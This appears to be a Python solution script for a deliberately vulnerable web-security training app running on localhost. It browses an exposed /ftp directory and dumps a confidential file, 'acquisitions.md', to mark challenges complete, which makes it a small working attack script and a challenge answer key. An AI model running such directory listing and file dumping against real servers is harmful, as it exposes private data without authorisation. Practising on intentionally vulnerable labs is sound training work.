import pprint
import requests
from data.Strings import star1_complete


url_ftp = "http://localhost:3000/ftp"

r = requests.get(url=url_ftp)
if r.status_code == 200:
    pprint.pprint(r.content)
    print("[!] Visited ftp page at ../ftp")
    print("[!] Please look through the output for itneresting directories.")
    print("[!] Use those directories to find useful files.")

url_ftp+="/acquisitions.md"

print("[!] Looking up the file {}.".format(url_ftp))
print("[!] Dumping the file {}.".format(url_ftp))

r_1 = requests.get(url_ftp)
if r_1.status_code == 200:
    pprint.pprint(r_1.text)

print(star1_complete.format("Confidential Document"))

# Run any of the requests badly to complete "Error Handling" challenge.
url_ftp = "http://localhost:3000/ftp"

r = requests.get(url=url_ftp)